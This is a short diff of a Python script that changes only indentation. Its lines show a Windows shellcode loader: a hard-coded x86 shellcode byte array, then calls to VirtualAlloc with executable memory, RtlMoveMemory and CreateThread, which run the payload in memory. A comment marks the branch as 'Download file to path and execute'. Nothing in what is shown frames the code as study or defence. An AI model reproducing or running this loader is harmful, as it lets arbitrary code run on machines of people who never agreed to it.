@@ -22,7 +22,7 @@ if os.path.isfile(PATH) and os.access(PATH, os.R_OK):
 else:
 	# Download file to path and execute (shellcode)
 	shellcode = bytearray(
-    "\xdb\xc3\xd9\x74\x24\xf4\xbe\xe8\x5a\x27\x13\x5f\x31\xc9" 
+        "\xdb\xc3\xd9\x74\x24\xf4\xbe\xe8\x5a\x27\x13\x5f\x31\xc9" 
 	"\xb1\x33\x31\x77\x17\x83\xc7\x04\x03\x9f\x49\xc5\xe6\xa3" 
 	"\x86\x80\x09\x5b\x57\xf3\x80\xbe\x66\x21\xf6\xcb\xdb\xf5" 
 	"\x7c\x99\xd7\x7e\xd0\x09\x63\xf2\xfd\x3e\xc4\xb9\xdb\x71" 
@@ -41,22 +41,22 @@ else:
 	"\x5e\xa4\xb4")
  
 	ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
-											ctypes.c_int(len(shellcode)),
-											ctypes.c_int(0x3000),
-											ctypes.c_int(0x40))
+					ctypes.c_int(len(shellcode)),
+					ctypes.c_int(0x3000),
+					ctypes.c_int(0x40))
 	
 	buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
 	
 	ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
-										buf,
-										ctypes.c_int(len(shellcode)))
+					buf,
+					ctypes.c_int(len(shellcode)))
 	
 	ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
-											ctypes.c_int(0),
-											ctypes.c_int(ptr),
-											ctypes.c_int(0),
-											ctypes.c_int(0),
-											ctypes.pointer(ctypes.c_int(0)))
+						ctypes.c_int(0),
+						ctypes.c_int(ptr),
+						ctypes.c_int(0),
+						ctypes.c_int(0),
+						ctypes.pointer(ctypes.c_int(0)))
 	
 	ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 	
